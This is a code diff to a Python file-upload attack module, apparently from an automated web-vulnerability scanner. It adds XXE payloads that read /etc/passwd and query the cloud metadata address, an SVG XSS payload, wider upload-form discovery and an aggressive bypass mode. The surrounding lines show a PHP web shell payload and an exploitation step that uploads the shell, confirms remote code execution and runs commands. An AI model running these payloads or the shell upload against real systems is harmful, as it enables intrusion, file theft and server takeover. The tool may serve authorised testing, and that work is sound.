@@ -86,12 +86,30 @@ class UploadModule(BaseModule):
         "svg_xss": b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
         "html_php": b"<html><body><?php system($_GET['c']); ?></body></html>",
     }
-    
+
+    file_format_abuse = [
+        (b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj", "pdf", "PDF parser abuse"),
+        (b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "xml", "XXE file read"),
+        (b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta">]><foo>&xxe;</foo>', "xml", "XXE SSRF"),
+        (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', "xss.svg", "SVG XSS"),
+    ]
+
     async def scan(self, target):
         self.findings = []
-        
         upload_forms = await self._find_upload_forms(target)
-        
+        parsed = urlparse(target)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        seen_actions = {urljoin(target, f.get("action", "")) for f in upload_forms}
+        for path in ["/upload", "/profile", "/settings", "/account", "/user/edit", "/admin/upload"]:
+            u = urljoin(base, path)
+            if u == target:
+                continue
+            more = await self._find_upload_forms(u)
+            for f in more:
+                act = urljoin(u, f.get("action", ""))
+                if act not in seen_actions:
+                    seen_actions.add(act)
+                    upload_forms.append(f)
         if upload_forms:
             self.add_finding(
                 "INFO",
@@ -105,6 +123,7 @@ class UploadModule(BaseModule):
                 await self._test_polyglot_uploads(target, form)
                 await self._test_content_type_bypass(target, form)
                 await self._test_size_bypass(target, form)
+                await self._test_file_format_abuse(target, form)
         
         await self._check_upload_directories(target)
         await self._check_api_uploads(target)
@@ -145,7 +164,11 @@ class UploadModule(BaseModule):
         
         test_content = b"GIF89a\n<?php echo 'LANTERN_UPLOAD_TEST'; ?>"
         
-        for filename, technique in self.bypass_techniques[:8]:
+        bypass_list = self.bypass_techniques[:8]
+        if self.aggressive:
+            bypass_list = self.bypass_techniques[:20]
+        
+        for filename, technique in bypass_list:
             try:
                 import aiohttp
                 data = aiohttp.FormData()
@@ -157,22 +180,32 @@ class UploadModule(BaseModule):
                     text = resp.get("text", "").lower()
                     
                     if any(x in text for x in ["success", "uploaded", "complete", "saved"]):
+                        confidence_evidence = ["upload_accepted", "bypass_technique"]
+                        if ".php" in filename.lower():
+                            confidence_evidence.append("php_extension")
+                        
                         self.add_finding(
                             "CRITICAL",
                             f"File upload bypass: {technique}",
                             url=action,
                             parameter=field_name,
-                            evidence=f"Filename: {filename}"
+                            evidence=f"Filename: {filename}",
+                            confidence_evidence=confidence_evidence,
+                            request_data={"method": "POST", "url": action, "field": field_name, "filename": filename}
                         )
                         return
                     
                     if "error" not in text and "invalid" not in text and "denied" not in text:
+                        confidence_evidence = ["no_rejection", "bypass_technique"]
+                        
                         self.add_finding(
                             "HIGH",
                             f"Possible file upload bypass: {technique}",
                             url=action,
                             parameter=field_name,
-                            evidence=f"Filename: {filename}, no rejection detected"
+                            evidence=f"Filename: {filename}, no rejection detected",
+                            confidence_evidence=confidence_evidence,
+                            request_data={"method": "POST", "url": action, "field": field_name, "filename": filename}
                         )
                         return
             except:
@@ -190,22 +223,49 @@ class UploadModule(BaseModule):
                 import aiohttp
                 data = aiohttp.FormData()
                 data.add_field(field_name, test_content, filename="shell.php", content_type=content_type)
-                
                 resp = await self.http.request("POST", action, data=data)
-                
                 if resp.get("status") in [200, 201, 302]:
                     text = resp.get("text", "").lower()
                     if "error" not in text and "invalid" not in text:
+                        confidence_evidence = ["content_type_bypass"]
+                        
                         self.add_finding(
                             "MEDIUM",
                             f"Content-Type bypass possible: {technique}",
                             url=action,
-                            evidence=f"Content-Type: {content_type}"
+                            evidence=f"Content-Type: {content_type}",
+                            confidence_evidence=confidence_evidence
                         )
                         return
-            except:
+            except Exception:
                 pass
-    
+
+    async def _test_file_format_abuse(self, target, form):
+        action = form.get("action", target)
+        if not action.startswith("http"):
+            action = urljoin(target, action)
+        input_name = re.search(r'<input[^>]+type=["\']?file["\']?[^>]+name=["\']?([^"\'>\s]+)', form["html"], re.IGNORECASE)
+        field_name = input_name.group(1) if input_name else "file"
+        for payload_bytes, ext, label in self.file_format_abuse:
+            try:
+                import aiohttp
+                data = aiohttp.FormData()
+                data.add_field(field_name, payload_bytes, filename=f"test.{ext}", content_type="application/octet-stream")
+                resp = await self.http.request("POST", action, data=data)
+                if resp.get("status") not in [200, 201, 302]:
+                    continue
+                text = (resp.get("text") or "").lower()
+                if "root:" in text or "passwd" in text:
+                    self.add_finding("CRITICAL", f"File-format abuse: XXE file read via {ext}", url=action, parameter=field_name, evidence=label)
+                    return
+                if "ami-id" in text or "instance-id" in text:
+                    self.add_finding("CRITICAL", f"File-format abuse: XXE SSRF via {ext}", url=action, parameter=field_name, evidence=label)
+                    return
+                if "error" not in text and "invalid" not in text:
+                    self.add_finding("MEDIUM", f"File-format abuse payload accepted: {label}", url=action, parameter=field_name, evidence=f"Filename: test.{ext}")
+            except Exception:
+                pass
+
     async def _check_upload_directories(self, target):
         parsed = urlparse(target)
         base = f"{parsed.scheme}://{parsed.netloc}"
@@ -490,12 +550,19 @@ class UploadModule(BaseModule):
                                             if uname_resp.get("status") == 200:
                                                 extracted["server_info"]["os"] = uname_resp.get("text", "")[:200]
                                             
+                                            confidence_evidence = ["shell_uploaded", "marker_verified", "rce_confirmed"]
+                                            if extracted["server_info"].get("user"):
+                                                confidence_evidence.append("command_output")
+                                            
                                             self.add_finding(
                                                 "CRITICAL",
                                                 f"UPLOAD EXPLOITED: RCE shell uploaded and verified!",
                                                 url=shell_url,
                                                 parameter=param,
-                                                evidence=f"Shell type: {shell_type}, Execute: {shell_url}?c=COMMAND"
+                                                evidence=f"Shell type: {shell_type}, Execute: {shell_url}?c=COMMAND",
+                                                confidence_evidence=confidence_evidence,
+                                                request_data={"method": "GET", "url": f"{shell_url}?c=id"},
+                                                response_data={"status": 200, "rce": True}
                                             )
                                             
                                             self.exploited_data = extracted
